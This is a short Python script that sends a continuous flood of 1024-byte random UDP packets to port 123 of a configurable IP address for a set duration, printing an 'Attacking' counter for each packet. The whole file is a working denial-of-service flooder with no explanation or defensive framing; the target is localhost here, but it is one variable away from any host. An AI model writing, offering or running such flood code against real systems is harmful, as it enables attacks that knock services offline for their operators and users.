#!/usr/bin/env python3

import time
import socket
import random
import sys

ip = "127.0.0.1"
port = 123
duration = 10

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
timeout =  time.time() + duration
sent = 0

while True:
	if time.time() > timeout:
		break
	else:
		pass
	client.sendto(bytes, (ip, port))
	sent = sent + 1
	print("Attacking " + str(sent) + " sent packages " + ip +  " at the port " + str(port))
